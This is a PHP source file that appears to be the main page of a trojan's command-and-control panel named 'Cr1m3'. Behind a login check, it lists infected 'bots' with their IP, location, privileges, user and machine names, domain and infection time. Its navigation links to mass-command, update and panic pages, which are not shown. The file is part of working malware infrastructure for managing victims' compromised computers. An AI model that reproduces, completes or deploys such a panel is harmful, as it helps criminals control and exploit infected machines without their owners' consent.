<?php
// pantalla principal
	require_once("mod_login.php");
	require_once("db.php");
	
//main()

	if(__login_status()==false) {
		header("Location: login.php");
		return 0;	
	}

?>

<html>
<head>
        <title>cr1m3 tr0jan...</title>
        <link type="text/css" rel="stylesheet" href="css/main.css">
</head>
<body>

<header>
	<h1>Cr1m3</h1>
</header>
<nav>
	<ul>
		<li><a href="./main.php">Main</a></li>
		<li><a href="./list.php">Bots</a></li>
		<li><a href="./massive.php">Massive</a></li>
		<li><a href="./update.php">Update</a></li>
		<li><a href="./panic.php">Panic</a></li>
		<li><a href="./logout.php">Logout</a></li>
	</ul>
</nav>
<section class="list_section">
	<article>
		<table>
			<tr>
				<th>IP</th>
				<th>GEO</th>
				<th>PRIV</th>
				<th>USER_NAME</th>
				<th>PC_NAME</th>
				<th>DOMAIN</th>
				<th>LAST</th>
				<th>INFECTION</th>
			</tr>
	 		<?php __db_list_all_bots(); ?>	
		</table>
	</article>
</section>

<footer>
	@cr1m3 // by h0ffy (JennyLab)
</footer>


</body>
</html>
